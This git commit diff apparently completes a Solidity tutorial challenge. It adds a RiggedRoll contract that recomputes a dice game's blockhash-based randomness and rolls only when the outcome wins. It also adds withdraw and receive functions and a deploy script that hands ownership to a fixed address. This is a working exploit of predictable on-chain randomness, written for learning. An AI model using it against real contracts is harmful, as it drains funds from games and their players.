14eb608ed746fb53cfd0a57144e2afe846654cc8
blahkheart <dannithomx@gmail.com>
2022-11-20 00:33:47 +0100

    implemented RiggedRol.sol

--- packages/hardhat/contracts/RiggedRoll.sol
+++ packages/hardhat/contracts/RiggedRoll.sol
@@ -14,11 +14,27 @@ contract RiggedRoll is Ownable {
     }
 
     //Add withdraw function to transfer ether from the rigged contract to an address
-
+    function withdraw() public onlyOwner {
+        (bool success,) = payable(msg.sender).call{value: address(this).balance}("");
+        require(success, "failed to send ether");
+    }
 
     //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
+    function riggedRoll() public payable {
+        require(msg.value >= 0.002 ether, "Failed to send enough value");
 
+        bytes32 prevHash = blockhash(block.number - 1);
+        address diceGameAddress = address(diceGame);
+        bytes32 hash = keccak256(abi.encodePacked(prevHash, diceGameAddress, diceGame.nonce()));
+        uint256 roll = uint256(hash) % 16;
+
+        console.log("");
+        console.log('\t',"   Rigged Game Roll:", roll);
+        require(roll <= 2, "NOT WIN");
+        diceGame.rollTheDice{ value: msg.value}();
+    }
 
     //Add receive() function so contract can receive Eth
+    receive() external payable {}
     
 }
--- packages/hardhat/deploy/01_deploy_riggedRoll.js
+++ packages/hardhat/deploy/01_deploy_riggedRoll.js
@@ -9,17 +9,17 @@ module.exports = async ({ getNamedAccounts, deployments, getChainId }) => {
 
   const diceGame = await ethers.getContract("DiceGame", deployer);
 
-  /*
+  
   await deploy("RiggedRoll", {
    from: deployer,
    args: [diceGame.address],
    log: true,
   });
-  */
+  
 
-  //const riggedRoll = await ethers.getContract("RiggedRoll", deployer);
+  const riggedRoll = await ethers.getContract("RiggedRoll", deployer);
 
-  //const ownershipTransaction = await riggedRoll.transferOwnership("** YOUR FRONTEND ADDRESS **");
+  const ownershipTransaction = await riggedRoll.transferOwnership("0xCA7632327567796e51920F6b16373e92c7823854");
   
 
 };
